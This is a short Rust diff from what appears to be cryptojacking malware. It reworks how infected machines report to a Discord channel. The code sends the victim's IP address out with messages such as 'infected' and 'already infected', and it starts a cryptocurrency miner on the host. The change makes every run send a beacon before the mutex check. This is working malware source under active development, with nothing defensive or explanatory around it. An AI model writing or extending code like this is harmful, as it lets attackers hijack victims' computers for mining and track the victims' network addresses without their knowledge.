@@ -12,15 +12,15 @@ use log::info;
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     Builder::from_env(Env::default().default_filter_or("info")).init();
 
+    let mut discord = Discord::new();
+
+    discord.set_username("tnd now!!");
+
+    discord.send(String::from("checking infection status"));
+
     match mutex::lock() {
         Some(_) => {
-            let mut discord = Discord::new();
-
-            discord.set_username("lapras bot");
-
-            discord.set_content(format!("infected: {:?}", discord.get_ip()));
-
-            info!("response: {:?}", discord.send().map(|response| response.status()));
+            let _ = discord.send(format!("infected: {:?}", discord.get_ip()));
 
             let miner = Miner::new();
 
@@ -32,7 +32,9 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
             handle.wait()?;
         },
-        None => {},
+        None => {
+            let _ = discord.send(format!("already infected: {:?}", discord.get_ip()));
+        },
     }
 
     Ok(())
